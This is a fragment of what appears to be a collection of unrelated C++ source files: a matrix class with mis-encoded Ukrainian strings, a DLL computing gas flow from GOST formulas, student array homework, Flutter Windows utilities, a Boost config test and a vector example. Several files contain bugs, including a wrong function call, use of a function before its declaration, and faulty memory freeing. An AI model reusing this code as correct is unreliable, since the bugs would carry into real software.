= 0; k < other.data.size(); ++k) {\r\n                    result.data[i][j] += this->data[i][k] * other.data[k][j];\r\n                }\r\n            }\r\n        }\r\n\r\n        return result;\r\n    }\r\n\r\n    void fillByUserInput() {\r\n        int rows, cols;\r\n        cout << \"\u00c2\u00e2\u00e5\u00e4\u00b3\u00f2\u00fc \u00ea\u00b3\u00eb\u00fc\u00ea\u00b3\u00f1\u00f2\u00fc \u00f0\u00ff\u00e4\u00ea\u00b3\u00e2 \u00ec\u00e0\u00f2\u00f0\u00e8\u00f6\u00b3: \";\r\n        cin >> rows;\r\n        cout << \"\u00c2\u00e2\u00e5\u00e4\u00b3\u00f2\u00fc \u00ea\u00b3\u00eb\u00fc\u00ea\u00b3\u00f1\u00f2\u00fc \u00f1\u00f2\u00ee\u00e2\u00ef\u00f6\u00b3\u00e2 \u00ec\u00e0\u00f2\u00f0\u00e8\u00f6\u00b3: \";\r\n        cin >> cols;\r\n\r\n        data.resize(rows, vector<int>(cols));\r\n\r\n        for (int i = 0; i < rows; ++i) {\r\n            for (int j = 0; j < cols; ++j) {\r\n                cout << \"\u00c5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2 [\" << i << \"][\" << j << \"]: \";\r\n                cin >> data[i][j];\r\n            }\r\n        }\r\n    }\r\n\r\n    void print() const {\r\n        for (const auto& row : data) {\r\n            for (int elem : row) {\r\n                cout << elem << \" \";\r\n            }\r\n            cout << endl;\r\n        }\r\n    }\r\n};\r\n\r\nint main() {\r\n    SetConsoleOutputCP(1251);\r\n    SetConsoleCP(1251);\r\n\r\n    IntMatrix m1, m2;\r\n\r\n    cout << \"\u00c2\u00e2\u00e5\u00e4\u00b3\u00f2\u00fc \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00e8 \u00ef\u00e5\u00f0\u00f8\u00ee\u00bf \u00ec\u00e0\u00f2\u00f0\u00e8\u00f6\u00b3:\\n\";\r\n    m1.fillByUserInput();\r\n    cout << \"\u00c2\u00e2\u00e5\u00e4\u00b3\u00f2\u00fc \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00e8 \u00e4\u00f0\u00f3\u00e3\u00ee\u00bf \u00ec\u00e0\u00f2\u00f0\u00e8\u00f6\u00b3:\\n\";\r\n    m2.fillByUserInput();\r\n\r\n    try {\r\n        cout << \"\u00cc\u00e0\u00ea\u00f1\u00e8\u00ec\u00e0\u00eb\u00fc\u00ed\u00e8\u00e9 \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2 \u00ec\u00e0\u00f2\u00f0\u00e8\u00f6\u00b3 m1: \" << m1.maxElement() << endl;\r\n        cout << \"\u00cc\u00b3\u00ed\u00b3\u00ec\u00e0\u00eb\u00fc\u00ed\u00e8\u00e9 \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2 \u00ec\u00e0\u00f2\u00f0\u00e8\u00f6\u00b3 m1: \" << m1.minElement() << endl;\r\n\r\n        cout << \"\u00cc\u00e0\u00ea\u00f1\u00e8\u00ec\u00e0\u00eb\u00fc\u00ed\u00e8\u00e9 \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2 \u00ec\u00e0\u00f2\u00f0\u00e8\u00f6\u00b3 m2: \" << m2.maxElement() << endl;\r\n        cout << \"\u00cc\u00b3\u00ed\u00b3\u00ec\u00e0\u00eb\u00fc\u00ed\u00e8\u00e9 \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2 \u00ec\u00e0\u00f2\u00f0\u00e8\u00f6\u00b3 m2: \" << m2.minElement() << endl;\r\n\r\n        cout << \"\u00cc\u00ed\u00ee\u00e6\u00e5\u00ed\u00ed\u00ff \u00ec\u00e0\u00f2\u00f0\u00e8\u00f6\u00fc m1 \u00f2\u00e0 m2:\" << endl;\r\n        IntMatrix result = m1 * m2;\r\n        result.print();\r\n    }\r\n    catch (const exception& e) {\r\n        cout << e.what() << endl;\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "\ufeff// dllmain.cpp : \u041e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u0442 \u0442\u043e\u0447\u043a\u0443 \u0432\u0445\u043e\u0434\u0430 \u0434\u043b\u044f \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f DLL.\n#include \"pch.h\"\n#include \"dllmain.h\"\n\n\n\nBOOL APIENTRY DllMain( HMODULE hModule,\n                       DWORD  ul_reason_for_call,\n                       LPVOID lpReserved\n                     )\n{\n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n        break;\n    case DLL_THREAD_ATTACH:\n        break;\n    case DLL_THREAD_DETACH:\n        break;\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n\n\n\ndouble get_C(double Re, double B, double D) {\n    double A = pow((19000. * B / Re), 0.8);\n    double L1 = 0, L2 = 0; // \u0434\u043b\u044f \u0443\u0433\u043b\u043e\u0432\u043e\u0433\u043e \u0441\u043f\u043e\u0441\u043e\u0431\u0430 \u043e\u0442\u0431\u043e\u0440\u0430 \u0434\u0430\u0432\u043b\u0435\u043d\u0438\u0439\n    double M1 = 2 * L2 / (1 - B);\n    double M2 = 0;\n    if (D < 0.07112) {\n        M2 = 0.011 * (0.75 - B) * (2.8 - (D / 0.0254));\n    }\n    return 0.5961 + 0.0261 * pow(B, 2) - 0.216 * pow(B, 8) + 0.000521 * pow(((B * 1e6) / Re), 0.7) + (\n        0.0188 + 0.0063 * A) * pow(B, 3.5) * pow((1e6 / Re), 0.3) + (\n            0.043 + 0.08 * pow(e, (-10 * L1)) - 0.123 * pow(e, (-7 * L1))) * (1 - 0.11 * A) * (\n                pow(B, 4) / (1 - pow(B, 4))) - 0.031 * (M1 - 0.8 * pow(M1, 1.1)) * pow(B, 1.3) + M2;\n}\n\ndouble get_A(int i, double Re) {\n    double tab[3][3][4] = {\n        { // index 1\n            {8.87, -3.7114, 0.41841, 0},\n            {6.7307, -5.5844, 0.732485, 0},\n            {-10.244, 5.7094, 0.76477, 0}\n        },\n        { // index 2\n            {27.23, -11.458, 1.6117, -0.07567},\n            {-25.928, 12.426, -2.09397, 0.106143},\n            {1.7622, -3.8765, 1.05567, -0.076764}\n        },\n        { // index 3\n            {16.5416, -6.60709, 0.88147, -0.039226},\n            {322.594, -132.2, 17.795, -0.799765},\n            {-92.029, 37.935, -5.1885, 0.23583}\n        }\n    };\n\n    double sum = 0;\n    int tab_index = (Re <= 1e5) ? 0 : (Re <= 3e6) ? 1 : 2;\n\n    for (int k = 0; k < 4; ++k) {\n        sum += tab[tab_index][i][k] * pow(fabs(log10(Re)), k);\n    }\n\n    return sum;\n}\n\ndouble get_y(double Re, double Ra, double Ra_max, double Ra_min, double D, bool  mark) {\n    double Rsh = 0.0, kD = 0.0, kR = 5.035 / Re;\n\n    if (!mark) {\n        Rsh = pi * Ra;\n    }\n    else if (Ra > Ra_max) {\n        Rsh = pi * Ra_max;\n    }\n    else {\n        Rsh = pi * Ra_min;\n    }\n\n    kD = 0.26954 * Rsh / D;\n\n    return pow((1.74 - 2 * log10((2 * Rsh / D) - ((37.36 * log10(kD - kR * log10(kD + 3.3333 * kR))) / Re))), -2);\n}\n\ndouble get_Ksh(double Re, double Ra, double B, double D) {\n    double leftRa_max = 0, leftRa_min = 0, Ra_max = 0, Ra_min = 0;\n    // Ra_max   \n    if (Re <= 1e4) {\n        leftRa_max = 0.718866 * pow(B, (-3.887)) + 0.364;\n    }\n    else if (B < 0.65) {\n        leftRa_max = get_A(0, Re) * pow(B, get_A(1, Re)) + get_A(2, Re);\n    }\n    else {\n        leftRa_max = get_A(0, Re) * pow(0.65, get_A(1, Re)) + get_A(2, Re);\n    }\n\n    if (leftRa_max >= 15) {\n        Ra_max = 15e-4 * D;\n    }\n    else {\n        Ra_max = leftRa_max * 1e-4 * D;\n    }\n\n    // Ra_min\n    if (B < 0.65) {\n        leftRa_min = 7.1592 - 12.387 * B - (20.118 - 3.469 * B) * log10(Re) + (0.1382 - 0.23762 * B) * pow(log10(Re), 2);\n    }\n    else {\n        leftRa_min = -0.892352 + 0.24308 * log10(Re) - 0.0162562 * pow(log10(Re), 2);\n    }\n\n    if (leftRa_min <= 0 or Re < 3e6) {\n        Ra_min = 0;\n    }\n    else {\n        Ra_min = 1e-4 * D * leftRa_min;\n    }\n\n    if (Ra >= Ra_min and Ra <= Ra_max) {\n        return 1;\n    }\n    else {\n        double y0 = get_y(Re, Ra, Ra_max, Ra_min, D), y1 = get_y(Re, Ra, Ra_max, Ra_min, D, true);\n\n        return 1 + 5.22 * pow(B, 3.5) * (y0 - y1);\n    }\n\n\n}\n\ndouble get_qm(double Re_cur, double d, double Ksu, double E, double B, double D, double Ra, double Kp, double eps, double dP, double T, double P) {\n    double C = get_C(Re_cur, B, D); // (\u0413\u041e\u0421\u0422 8.586.2 \u043f.5.3.2.1)\n    double Ksh = get_Ksh(Re_cur, Ra, B, D); // (\u0413\u041e\u0421\u0422 8.586.2 \u043f.5.3.2.2)\n    return 0.25 * pi * pow(d, 2) * C * E * Ksh * Kp * eps * pow((2 * dP * Pls * ((P * Ts) / (Ps * T))), 0.5);\n}\n\ndouble get_true_qm(double u, double d_20, double Ksu, double E, double B, double D, double Ra, double Kp, double eps, double dP, double T, double P) {\n    double Re_first = 1e6;\n    double qm_first = get_qm(Re_first, d_20, Ksu, E, B, D, Ra, Kp, eps, dP, T, P); // (\u0413\u041e\u0421\u0422 8.568.5 \u043f.5.2.3)\n    double Re_cur = get_Re(qm_first, D, u); // (\u0413\u041e\u0421\u0422 8.568.5 \u043f.5.2.5)\n    double qm_cur = get_qm(Re_cur = Re_cur, d_20, Ksu, E, B, D, Ra, Kp, eps, dP, T, P);\n    while (100 * fabs(qm_cur - qm_first) / qm_first >= 0.001) {\n        qm_first = qm_cur;\n        Re_cur = get_Re(qm_first, D, u);\n        qm_cur = get_qm(Re_cur = Re_cur, d_20, Ksu, E, B, D, Ra, Kp, eps, dP, T, P);\n    }\n\n    return round(3600 * qm_cur); // \u043f\u0435\u0440\u0435\u0432\u043e\u0434 \u0432 \u043a\u0433/\u0447 \n}\n\ndouble get_Re(double qm, double D, double u) {\n    return (4 * qm) / (pi * D * u);\n};\n\n__declspec(dllexport) double __cdecl calc_airflow_mu(double p_izm, double dp_izm, double t_izm, double d_20, double D_20) {\n    // \u0418\u0441\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435\n\n    double Ra = 0.045e-3; // \u0421\u0440\u0435\u0434\u043d\u0435\u0435 \u0430\u0440\u0438\u0444\u043c\u0435\u0442\u0438\u0447\u0435\u0441\u043a\u043e\u0435 \u043e\u0442\u043a\u043b\u043e\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0444\u0438\u043b\u044f \u0448\u0435",
    "\ufeff// Homework20.03.2024 2d dinamic arrays.cpp : \u042d\u0442\u043e\u0442 \u0444\u0430\u0439\u043b \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u0444\u0443\u043d\u043a\u0446\u0438\u044e \"main\". \u0417\u0434\u0435\u0441\u044c \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u0442\u0441\u044f \u0438 \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b.\n//\n\n#include <iostream>\nusing namespace std;\n\n\nint** addStrk(int** ar, int width, int heigth);\nint** DelStrk(int** ar, int width, int heigth);\nint** addStolbets(int** ar, int width, int heigth);\nint** DelStolbets(int** ar, int width, int heigth);\nint main()\n{\n    unsigned int width = 8;\n    unsigned int heigth = 7;\n\n    int** ar = new int* [heigth];\n    cout << \"Array:\\n\\n\";\n    for (int y = 0; y < heigth; y++)\n    {\n        cout << \"\\t\\t\";\n        ar[y] = new int[width];\n        for (int x = 0; x < width; x++)\n        {\n            ar[y][x] = rand() % 100;\n            cout << ar[y][x] << \"\\t\";\n        }\n        cout << \"\\n\\n\";\n    }\n\n    int** arAddStrk = addStrk(ar, width, heigth);\n    cout << \"Array with added string to the end:\\n\\n\";\n    for (int y = 0; y < heigth + 1; y++) \n    {\n        cout << \"\\t\\t\";\n        for (int x = 0; x < width; x++) \n        {\n            cout << arAddStrk[y][x] << \"\\t\";\n        }\n        cout << \"\\n\\n\";\n    }\n    \n    int** arDelStrk = DelStrk(ar, width, heigth + 1);\n    cout << \"Array with deleted string to the end:\\n\\n\";\n    for (int y = 0; y < heigth; y++)\n    {\n        cout << \"\\t\\t\";\n        for (int x = 0; x < width; x++)\n        {\n            cout << arDelStrk[y][x] << \"\\t\";\n        }\n        cout << \"\\n\\n\";\n    }\n    \n    int** arAddStolbets = addStolbets(ar, width, heigth);\n    cout << \"Array with added stolbets to the end:\\n\\n\";\n    for (int y = 0; y < heigth; y++)\n    {\n        cout << \"\\t\\t\";\n        for (int x = 0; x < width + 1; x++)\n        {\n            cout << arAddStolbets[y][x] << \"\\t\";\n        }\n        cout << \"\\n\\n\";\n    }\n    \n    int** arDelStolbets = DelStolbets(ar, width +1, heigth);\n    cout << \"Array with deleted stolbets to the end:\\n\\n\";\n    for (int y = 0; y < heigth; y++)\n    {\n        cout << \"\\t\\t\";\n        for (int x = 0; x < width; x++)\n        {\n            cout << arDelStolbets[y][x] << \"\\t\";\n        }\n        cout << \"\\n\\n\";\n    }\n    \n    \n    for (int y = 0; y < heigth; y++) \n    {\n        delete[] ar[y];\n    }\n    delete[] ar;\n    ar = nullptr;\n    \n    for (int y = 0; y < heigth ; y++) \n    {\n        delete[] arAddStrk[y];\n    }\n    delete[] arAddStrk;\n    arAddStrk = nullptr;\n    \n    for (int y = 0; y < heigth; y++)\n    {\n        delete[] arDelStrk[y];\n    }\n    delete[] arDelStrk;\n    arDelStrk = nullptr;\n    \n    for (int y = 0; y < heigth; y++)\n    {\n        delete[] arAddStolbets[y];\n    }\n    delete[] arAddStolbets;\n    arAddStolbets = nullptr;\n\n    for (int y = 0; y < heigth; y++)\n    {\n        delete[] arDelStolbets[y];\n    }\n    delete[] arDelStolbets;\n    arDelStolbets = nullptr;\n}\n\n\nint** addStrk(int** ar, int width, int heigth)\n{\n    int** arAddStrk = new int* [heigth + 1];\n    for (int y = 0; y < heigth; y++)\n    {\n        arAddStrk[y] = new int[width];\n        for (int x = 0; x < width; x++)\n        {\n            arAddStrk[y][x] = ar[y][x];\n        }\n    }\n    arAddStrk[heigth] = new int[width] {};\n    return arAddStrk;\n}\nint** DelStrk(int** arAddStrk, int width, int heigth)\n{\n    int** arDelStrk = new int* [heigth];\n    for (int y = 0; y < heigth - 1; y++)\n    {\n        arDelStrk[y] = new int[width];\n        for (int x = 0; x < width; x++)\n        {\n            arDelStrk[y][x] = arAddStrk[y][x];\n        }\n    }\n    arDelStrk[heigth - 1] = new int[width];\n    return arDelStrk;\n}\n\nint** addStolbets(int** arDelStrk, int width, int heigth)\n{\n    int** arAddStolbets = new int* [heigth];\n    for (int y = 0; y < heigth; y++)\n    {\n        arAddStolbets[y] = new int[width + 1];\n        for (int x = 0; x < width; x++)\n        {\n            arAddStolbets[y][x] = arDelStrk[y][x];\n        }\n        arAddStolbets[y][width] = 0;\n    }\n    \n    return arAddStolbets;\n}\n\nint** DelStolbets(int** ar, int width, int heigth)\n{\n    int** arDelStolbets = new int* [heigth];\n    for (int y = 0; y < heigth; y++)\n    {\n        arDelStolbets[y] = new int[width -1];\n        for (int x = 0; x < width - 1; x++)\n        {\n            arDelStolbets[y][x] = ar[y][x];\n        }\n    }\n    return arDelStolbets;\n}\n\n// \u0417\u0430\u043f\u0443\u0441\u043a \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b: CTRL+F5 \u0438\u043b\u0438 \u043c\u0435\u043d\u044e \"\u041e\u0442\u043b\u0430\u0434\u043a\u0430\" > \"\u0417\u0430\u043f\u0443\u0441\u043a \u0431\u0435\u0437 \u043e\u0442\u043b\u0430\u0434\u043a\u0438\"\n// \u041e\u0442\u043b\u0430\u0434\u043a\u0430 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b: F5 \u0438\u043b\u0438 \u043c\u0435\u043d\u044e \"\u041e\u0442\u043b\u0430\u0434\u043a\u0430\" > \"\u0417\u0430\u043f\u0443\u0441\u0442\u0438\u0442\u044c \u043e\u0442\u043b\u0430\u0434\u043a\u0443\"\n\n// \u0421\u043e\u0432\u0435\u0442\u044b \u043f\u043e \u043d\u0430\u0447\u0430\u043b\u0443 \u0440\u0430\u0431\u043e\u0442\u044b \n//   1. \u0412 \u043e\u043a\u043d\u0435 \u043e\u0431\u043e\u0437\u0440\u0435\u0432\u0430\u0442\u0435\u043b\u044f \u0440\u0435\u0448\u0435\u043d\u0438\u0439 \u043c\u043e\u0436\u043d\u043e \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0442\u044c \u0444\u0430\u0439\u043b\u044b \u0438 \u0443\u043f\u0440\u0430\u0432\u043b\u044f\u0442\u044c \u0438\u043c\u0438.\n//   2. \u0412 \u043e\u043a\u043d\u0435 Team Explorer \u043c\u043e\u0436\u043d\u043e \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0438\u0442\u044c\u0441\u044f \u043a \u0441\u0438\u0441\u0442\u0435\u043c\u0435 \u0443\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u0432\u0435\u0440\u0441\u0438\u044f\u043c\u0438.\n//   3. \u0412 \u043e\u043a\u043d\u0435 \"\u0412\u044b\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435\" \u043c\u043e\u0436\u043d\u043e \u043f\u0440\u043e\u0441\u043c\u0430\u0442\u0440\u0438\u0432\u0430\u0442\u044c \u0432\u044b\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435 \u0441\u0431\u043e\u0440\u043a\u0438 \u0438 \u0434\u0440\u0443\u0433\u0438\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f.\n//   4. \u0412 \u043e\u043a\u043d\u0435 \"\u0421\u043f\u0438\u0441\u043e\u043a \u043e\u0448\u0438\u0431\u043e\u043a\" \u043c\u043e\u0436\u043d\u043e \u043f\u0440\u043e\u0441\u043c\u0430\u0442\u0440\u0438\u0432\u0430\u0442\u044c \u043e\u0448\u0438\u0431\u043a\u0438.\n//   5. \u041f\u043e\u0441\u043b\u0435\u0434\u043e\u0432\u0430\u0442\u0435\u043b\u044c\u043d\u043e \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442\u044b \u043c\u0435\u043d\u044e \"\u041f\u0440\u043e\u0435\u043a\u0442\" > \"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043d\u043e\u0432\u044b\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\", \u0447\u0442\u043e\u0431\u044b \u0441\u043e\u0437\u0434\u0430\u0442\u044c \u0444\u0430\u0439\u043b\u044b \u043a\u043e\u0434\u0430, \u0438\u043b\u0438 \"\u041f\u0440\u043e\u0435\u043a\u0442\" > \"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0438\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\", \u0447\u0442\u043e\u0431\u044b \u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0432 \u043f\u0440\u043e\u0435\u043a\u0442 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0438\u0435 \u0444\u0430\u0439\u043b\u044b \u043a\u043e\u0434\u0430.\n//   6. \u0427\u0442\u043e\u0431\u044b \u0441\u043d\u043e\u0432\u0430 \u043e\u0442\u043a\u0440\u044b\u0442\u044c \u044d\u0442\u043e\u0442 \u043f\u0440\u043e\u0435\u043a\u0442 \u043f\u043e\u0437\u0436\u0435, \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442\u044b \u043c\u0435\u043d\u044e \"\u0424\u0430\u0439\u043b\" > \"\u041e\u0442\u043a\u0440\u044b\u0442\u044c\" > \"\u041f\u0440\u043e\u0435\u043a\u0442\" \u0438 \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 SLN-\u0444\u0430\u0439\u043b.\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "//  This file was automatically generated on Mon Apr 17 18:06:53 2017\n//  by libs/config/tools/generate.cpp\n//  Copyright John Maddock 2002-4.\n//  Use, modification and distribution are subject to the \n//  Boost Software License, Version 1.0. (See accompanying file \n//  LICENSE_1_0.txt or copy at http://www.boost.org/LICENSE_1_0.txt)\n\n//  See http://www.boost.org/libs/config for the most recent version.//\n//  Revision $Id$\n//\n\n\n// Test file for macro BOOST_NO_CXX98_BINDERS\n// This file should compile, if it does not then\n// BOOST_NO_CXX98_BINDERS should be defined.\n// See file boost_no_cxx98_binders.ipp for details\n\n// Must not have BOOST_ASSERT_CONFIG set; it defeats\n// the objective of this file:\n#ifdef BOOST_ASSERT_CONFIG\n#  undef BOOST_ASSERT_CONFIG\n#endif\n\n#include <boost/config.hpp>\n#include \"test.hpp\"\n\n#ifndef BOOST_NO_CXX98_BINDERS\n#include \"boost_no_cxx98_binders.ipp\"\n#else\nnamespace boost_no_cxx98_binders = empty_boost;\n#endif\n\nint main( int, char *[] )\n{\n   return boost_no_cxx98_binders::test();\n}\n\n",
    "\ufeff// vectoor.cpp : \u042d\u0442\u043e\u0442 \u0444\u0430\u0439\u043b \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u0444\u0443\u043d\u043a\u0446\u0438\u044e \"main\". \u0417\u0434\u0435\u0441\u044c \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u0442\u0441\u044f \u0438 \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b.\n//\n\n#include <iostream>\n#include <vector>\n#include <algorithm>\n#include <list>\nusing namespace std;\nclass Point {\n    int x;\npublic:\n    Point(int a) {\n        x = a;\n   }\n   \n    void friend Print(Point& x);\n};\nvoid  Print(Point& x) {\n    cout  << \"Number: \" << x.x << endl;\n}\nint main()\n{\n    vector<Point> number;\n    number.push_back(Point(1));\n    number.push_back(Point(2));\n    number.push_back(Point(3));\n    number.push_back(Point(4));\n    number.push_back(Point(5));\n    for_each(number.begin(), number.end(), Print);\n    list<Point> theList;\n    \n    theList.push_back(Point(6));\n    theList.push_back(Point(7));\n    theList.push_back(Point(8));\n    theList.push_back(Point(9));\n    theList.push_back(Point(10));\n    for_each(theList.begin(), theList.end(), Print);\n   \n\n}\n\n// \u0417\u0430\u043f\u0443\u0441\u043a \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b: CTRL+F5 \u0438\u043b\u0438 \u043c\u0435\u043d\u044e \"\u041e\u0442\u043b\u0430\u0434\u043a\u0430\" > \"\u0417\u0430\u043f\u0443\u0441\u043a \u0431\u0435\u0437 \u043e\u0442\u043b\u0430\u0434\u043a\u0438\"\n// \u041e\u0442\u043b\u0430\u0434\u043a\u0430 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b: F5 \u0438\u043b\u0438 \u043c\u0435\u043d\u044e \"\u041e\u0442\u043b\u0430\u0434\u043a\u0430\" > \"\u0417\u0430\u043f\u0443\u0441\u0442\u0438\u0442\u044c \u043e\u0442\u043b\u0430\u0434\u043a\u0443\"\n\n// \u0421\u043e\u0432\u0435\u0442\u044b \u043f\u043e \u043d\u0430\u0447\u0430\u043b\u0443 \u0440\u0430\u0431\u043e\u0442\u044b \n//   1. \u0412 \u043e\u043a\u043d\u0435 \u043e\u0431\u043e\u0437\u0440\u0435\u0432\u0430\u0442\u0435\u043b\u044f \u0440\u0435\u0448\u0435\u043d\u0438\u0439 \u043c\u043e\u0436\u043d\u043e \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0442\u044c \u0444\u0430\u0439\u043b\u044b \u0438 \u0443\u043f\u0440\u0430\u0432\u043b\u044f\u0442\u044c \u0438\u043c\u0438.\n//   2. \u0412 \u043e\u043a\u043d\u0435 Team Explorer \u043c\u043e\u0436\u043d\u043e \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0438\u0442\u044c\u0441\u044f \u043a \u0441\u0438\u0441\u0442\u0435\u043c\u0435 \u0443\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u0432\u0435\u0440\u0441\u0438\u044f\u043c\u0438.\n//   3. \u0412 \u043e\u043a\u043d\u0435 \"\u0412\u044b\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435\" \u043c\u043e\u0436\u043d\u043e \u043f\u0440\u043e\u0441\u043c\u0430\u0442\u0440\u0438\u0432\u0430\u0442\u044c \u0432\u044b\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435 \u0441\u0431\u043e\u0440\u043a\u0438 \u0438 \u0434\u0440\u0443\u0433\u0438\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f.\n//   4. \u0412 \u043e\u043a\u043d\u0435 \"\u0421\u043f\u0438\u0441\u043e\u043a \u043e\u0448\u0438\u0431\u043e\u043a\" \u043c\u043e\u0436\u043d\u043e \u043f\u0440\u043e\u0441\u043c\u0430\u0442\u0440\u0438\u0432\u0430\u0442\u044c \u043e\u0448\u0438\u0431\u043a\u0438.\n//   5. \u041f\u043e\u0441\u043b\u0435\u0434\u043e\u0432\u0430\u0442\u0435\u043b\u044c\u043d\u043e \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442\u044b \u043c\u0435\u043d\u044e \"\u041f\u0440\u043e\u0435\u043a\u0442\" > \"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043d\u043e\u0432\u044b\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\", \u0447\u0442\u043e\u0431\u044b \u0441\u043e\u0437\u0434\u0430\u0442\u044c \u0444\u0430\u0439\u043b\u044b \u043a\u043e\u0434\u0430, \u0438\u043b\u0438 \"\u041f\u0440\u043e\u0435\u043a\u0442\" > \"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0438\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\", \u0447\u0442\u043e\u0431\u044b \u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0432 \u043f\u0440\u043e\u0435\u043a\u0442 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0438\u0435 \u0444\u0430\u0439\u043b\u044b \u043a\u043e\u0434\u0430.\n//   6. \u0427\u0442\u043e\u0431\u044b \u0441\u043d\u043e\u0432\u0430 \u043e\u0442\u043a\u0440\u044b\u0442\u044c \u044d\u0442\u043e\u0442 \u043f\u0440\u043e\u0435\u043a\u0442 \u043f\u043e\u0437\u0436\u0435, \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442\u044b \u043c\u0435\u043d\u044e \"\u0424\u0430\u0439\u043b\" > \"\u041e\u0442\u043a\u0440\u044b\u0442\u044c\" > \"\u041f\u0440\u043e\u0435\u043a\u0442\" \u0438 \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 SLN-\u0444\u0430\u0439\u043b.\n",
